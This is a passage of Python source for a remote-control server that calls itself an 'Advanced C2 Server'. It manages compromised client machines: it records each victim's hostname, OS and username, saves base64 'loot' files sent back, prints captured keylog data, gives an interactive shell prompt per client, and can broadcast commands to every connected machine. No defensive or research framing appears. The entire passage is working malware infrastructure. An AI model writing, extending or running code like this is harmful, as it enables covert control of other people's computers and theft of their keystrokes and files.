            self._process_system_info(client_id, msg.get('info', {}))
            
        elif msg_type == 'result':
            self._process_task_result(client_id, msg)
            
        elif msg_type == 'error':
            self.logger.error(f"Client {client_id} error: {msg.get('error', 'Unknown')}")
            
        elif msg_type == 'loot':
            self._process_loot(client_id, msg)
            
        else:
            self.logger.debug(f"Unknown message type from {client_id}: {msg_type}")
    
    def _process_system_info(self, client_id: str, info: Dict):
        """Process system information"""
        try:
            # Update database
            self.db.execute('''
                INSERT OR REPLACE INTO clients 
                (id, ip, hostname, os, os_version, architecture, username, 
                 cpu_info, memory_total, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                client_id,
                self.clients[client_id].addr[0],
                info.get('hostname', ''),
                info.get('os', ''),
                info.get('os_version', ''),
                info.get('architecture', ''),
                info.get('username', ''),
                info.get('processor', ''),
                info.get('memory_total', 0),
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat(),
                'active'
            ))
            self.db.commit()
            
            self.logger.info(f"System info received from {client_id}", client_id)
            
        except Exception as e:
            self.logger.error(f"Error processing system info: {e}")
    
    def _process_task_result(self, client_id: str, msg: Dict):
        """Process task result"""
        task_id = msg.get('command_id')
        data = msg.get('data', {})
        
        if task_id:
            try:
                self.task_manager.update_task(task_id, 'completed', data)
                self.logger.success(f"Task {task_id} completed from {client_id}", client_id)
            except Exception as e:
                self.logger.error(f"Failed to update task {task_id}: {e}")
            
            # Display result
            try:
                self._display_task_result(data)
            except Exception as e:
                self.logger.error(f"Error displaying task result: {e}")
                print(f"Raw data: {data}")
    
    def _process_loot(self, client_id: str, msg: Dict):
        """Process loot data"""
        try:
            loot_type = msg.get('loot_type', 'unknown')
            data_b64 = msg.get('data', '')
            filename = msg.get('filename')
            
            data = base64.b64decode(data_b64)
            
            loot_info = self.loot_manager.save_loot(client_id, loot_type, data, filename)
            
            self.logger.success(f"Loot saved: {loot_info['filename']} ({loot_info['size']} bytes)", client_id)
            
        except Exception as e:
            self.logger.error(f"Loot processing error: {e}")
    
    def _display_task_result(self, data: Any):
        """Display task result with better formatting"""
        if not data:
            print(f"{Fore.YELLOW}Task returned no data{Style.RESET_ALL}")
            return

        if isinstance(data, dict):
            # Check for standard fields
            has_output = False
            
            if data.get('stdout'):
                print(f"\n{Fore.GREEN}--- STDOUT ---{Style.RESET_ALL}")
                print(data['stdout'])
                has_output = True
            
            if data.get('stderr'):
                print(f"\n{Fore.RED}--- STDERR ---{Style.RESET_ALL}")
                print(data['stderr'])
                has_output = True
            
            if data.get('error'):
                print(f"\n{Fore.RED}--- ERROR ---{Style.RESET_ALL}")
                print(data['error'])
                has_output = True
                
            if 'returncode' in data:
                print(f"{Fore.CYAN}Return Code: {data['returncode']}{Style.RESET_ALL}")
                has_output = True
                
            if 'cwd' in data:
                print(f"{Fore.BLUE}CWD: {data['cwd']}{Style.RESET_ALL}")
                has_output = True

            if data.get('success') and data.get('path'):
                print(f"\n{Fore.GREEN}SUCCESS: File successfully uploaded to {data['path']}{Style.RESET_ALL}")
                if data.get('size'):
                    print(f"Total size: {data['size']} bytes")
                has_output = True

            # Special handlers
            if 'keys' in data:
                print(f"\n{Fore.YELLOW}--- KEYLOG DATA ---{Style.RESET_ALL}")
                print(data['keys'])
                has_output = True

            # Fallback if nothing was printed but it's a dict
            if not has_output:
                print(f"\n{Fore.BLUE}--- RAW RESULT ---{Style.RESET_ALL}")
                print(json.dumps(data, indent=2))
        
        else:
            print(f"\n{Fore.BLUE}--- RESULT ---{Style.RESET_ALL}")
            print(str(data))
    
    def _send_pending_tasks(self, client_id: str):
        """Send pending tasks to client"""
        tasks = self.task_manager.get_pending_tasks(client_id)
        
        for task in tasks:
            self._send_encrypted(client_id, {
                'type': task['type'],
                'id': task['id'],
                **task['command']
            })
            
            self.logger.debug(f"Sent task {task['id']} to {client_id}", client_id)
    
    def _heartbeat_monitor(self):
        """Monitor client heartbeats"""
        while self.running:
            time.sleep(10)
            
            current_time = time.time()
            with self.client_lock:
                for client_id, client in list(self.clients.items()):
                    if current_time - client.last_heartbeat > self.config.heartbeat_timeout * 2:
                        self.logger.warning(f"Client {client_id} heartbeat timeout")
                        try:
                            client.sock.close()
                        except:
                            pass
                        del self.clients[client_id]
    
    def _cli_loop(self):
        """Command line interface loop"""
        while self.running:
            try:
                # Show prompt with selected client
                if self.selected_client:
                    client_short = self.selected_client[:8]
                    if self.command_parser.shell_mode:
                        prompt = f"{Fore.CYAN}({client_short}){Style.RESET_ALL} {Fore.RED}shell>{Style.RESET_ALL} "
                    else:
                        prompt = f"{Fore.CYAN}({client_short}){Style.RESET_ALL} {Fore.GREEN}c2>{Style.RESET_ALL} "
                else:
                    prompt = f"{Fore.GREEN}c2>{Style.RESET_ALL} "
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                # Parse and execute command
                if not self.command_parser.parse(command):
                    break
                    
            except (KeyboardInterrupt, EOFError):
                print()
                if input(f"{Fore.RED}Exit server? (yes/no): {Style.RESET_ALL}").lower() == 'yes':
                    break
            except Exception as e:
                self.logger.error(f"CLI error: {e}")
        
        self.running = False
    
    def list_clients(self):
        """List all connected clients"""
        with self.client_lock:
            if not self.clients:
                print(f"\n{Fore.YELLOW}No clients connected{Style.RESET_ALL}")
                return
            
            print(f"\n{Fore.CYAN}Connected Clients ({len(self.clients)}):{Style.RESET_ALL}")
            print(f"{'ID':<20} {'IP':<15} {'Hostname':<20} {'OS':<15} {'Last Seen':<20}")
            print("-" * 90)
            
            for client_id, client in self.clients.items():
                # Get client info from database
                cursor = self.db.execute(
                    'SELECT hostname, os, last_seen FROM clients WHERE id=?',
                    (client_id,)
                )
                row = cursor.fetchone()
                
                if row:
                    hostname = row['hostname'][:18] if row['hostname'] else 'Unknown'
                    os = row['os'][:13] if row['os'] else 'Unknown'
                    last_seen = row['last_seen'][:19] if row['last_seen'] else 'Now'
                else:
                    hostname = 'Unknown'
                    os = 'Unknown'
                    last_seen = 'Now'
                
                # Selected indicator
                selected = "➤ " if client_id == self.selected_client else "  "
                
                print(f"{selected}{client_id[:18]:<18} {client.addr[0]:<15} {hostname:<20} {os:<15} {last_seen:<20}")
            
            print()
    
    def show_client_info(self, client_id: str):
        """Show detailed client information"""
        cursor = self.db.execute('SELECT * FROM clients WHERE id=?', (client_id,))
        row = cursor.fetchone()
        
        if not row:
            self.logger.error(f"Client not found: {client_id}")
            return
        
        print(f"\n{Fore.CYAN}Client Information: {client_id}{Style.RESET_ALL}")
        print("-" * 60)
        
        for key, value in dict(row).items():
            if value and key not in ['id']:
                print(f"{Fore.GREEN}{key.replace('_', ' ').title():<20}:{Style.RESET_ALL} {value}")
        
        print()
    
    def show_client_tasks(self, client_id: str):
        """Show client task history"""
        cursor = self.db.execute('''
            SELECT id, type, status, created, completed 
            FROM tasks WHERE client_id=? 
            ORDER BY created DESC LIMIT 20
        ''', (client_id,))
        
        rows = cursor.fetchall()
        
        if not rows:
            print(f"{Fore.YELLOW}No tasks found for client{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}Recent Tasks for {client_id}:{Style.RESET_ALL}")
        print(f"{'ID':<16} {'Type':<12} {'Status':<12} {'Created':<20} {'Completed':<20}")
        print("-" * 80)
        
        for row in rows:
            status_color = {
                'completed': Fore.GREEN,
                'pending': Fore.YELLOW,
                'failed': Fore.RED,
                'sent': Fore.BLUE
            }.get(row['status'], Fore.WHITE)
            
            print(f"{row['id']:<16} {row['type']:<12} "
                  f"{status_color}{row['status']:<12}{Style.RESET_ALL} "
                  f"{row['created'][:19]:<20} "
                  f"{row['completed'][:19] if row['completed'] else '':<20}")
        
        print()
    
    def list_loot(self):
        """List loot files"""
        cursor = self.db.execute('''
            SELECT id, client_id, type, filename, size, timestamp 
            FROM loot ORDER BY timestamp DESC LIMIT 50
        ''')
        
        rows = cursor.fetchall()
        
        if not rows:
            print(f"{Fore.YELLOW}No loot found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}Recent Loot:{Style.RESET_ALL}")
        print(f"{'ID':<6} {'Client':<16} {'Type':<12} {'File':<30} {'Size':<10} {'Timestamp':<20}")
        print("-" * 94)
        
        for row in rows:
            size_str = self._format_size(row['size'])
            print(f"{row['id']:<6} {row['client_id'][:14]:<16} "
                  f"{row['type']:<12} {row['filename'][:28]:<30} "
                  f"{size_str:<10} {row['timestamp'][:19]:<20}")
        
        print()
    
    def get_loot_file(self, loot_id: str):
        """Get loot file information"""
        cursor = self.db.execute('SELECT * FROM loot WHERE id=?', (loot_id,))
        row = cursor.fetchone()
        
        if not row:
            self.logger.error(f"Loot not found: {loot_id}")
            return
        
        print(f"\n{Fore.CYAN}Loot Information:{Style.RESET_ALL}")
        print("-" * 60)
        print(f"ID: {row['id']}")
        print(f"Client: {row['client_id']}")
        print(f"Type: {row['type']}")
        print(f"File: {row['filename']}")
        print(f"Path: {row['filepath']}")
        print(f"Size: {self._format_size(row['size'])}")
        print(f"Hash: {row['hash']}")
        print(f"Timestamp: {row['timestamp']}")
        print()
    
    def select_client(self, client_id: str) -> bool:
        """Select a client (check memory and database)"""
        # First check in-memory active clients
        if client_id in self.clients:
            self.selected_client = client_id
            return True
            
        # Then check database for known clients
        cursor = self.db.execute('SELECT id FROM clients WHERE id=?', (client_id,))
        if cursor.fetchone():
            self.selected_client = client_id
            return True
            
        return False
    
    def send_command(self, client_id: str, cmd_type: str, params: Dict) -> bool:
        """Send command to client"""
        task_id = self.task_manager.create_task(client_id, cmd_type, params)
        
        # Try immediate send if client is connected
        with self.client_lock:
            if client_id in self.clients:
                self._send_encrypted(client_id, {
                    'type': cmd_type,
                    'id': task_id,
                    **params
                })
                self.logger.info(f"Command sent to {client_id}: {cmd_type}", client_id)
                return True
            else:
                self.logger.warning(f"Client {client_id} not connected, task queued", client_id)
                return False
    
    def broadcast_command(self, cmd_type: str, params: Dict):
        """Broadcast command to all clients"""
        count = 0
        with self.client_lock:
            for client_id in self.clients:
                if self.send_command(client_id, cmd_type, params):
                    count += 1
        
        self.logger.info(f"Broadcast sent to {count} clients")
    
    def _format_size(self, size: int) -> str:
        """Format file size"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"
    
    def cleanup(self):
        """Cleanup resources"""
        self.logger.info("Shutting down server...")
        
        # Close all client connections
        with self.client_lock:
            for client in self.clients.values():
                try:
                    client.sock.close()
                except:
                    pass
            self.clients.clear()
        
        # Close database
        self.db.close()
        
        self.logger.success("Server shutdown complete")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Advanced C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Bind host')
    parser.add_argument('--port', type=int, default=4444, help='Bind port')
    parser.add_argument('--ssl', action='store_true', help='Enable SSL')
    parser.add_argument('--cert', default='server.crt', help='SSL certificate')
    parser.add_argument('--key', default='server.key', help='SSL key')
    parser.add_argument('--loot-dir', default='loot', help='Loot directory')
    parser.add_argument('--db', default='c2.db', help='Database file')
    parser.add_argument('--log', default='c2_server.log', help='Log file')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    parser.add_argument('--daemon', action='store_true', help='Run as daemon')
    
    args = parser.parse_args()
    
    # Create configuration
    config = ServerConfig(
        host=args.host,
        port=args.port,
        ssl_enabled=args.ssl,
        ssl_cert=args.cert,
        ssl_key=args.key,
        loot_dir=args.loot_dir,
        database=args.db,
        log_file=args.log,
        debug=args.debug,
        daemon=args.daemon
    )
    
    # Create and start server
    server = AdvancedC2Server(config)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Shutting down...{Style.RESET_ALL}")
        server.cleanup()
    except Exception as e:
        print(f"{Fore.RED}Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()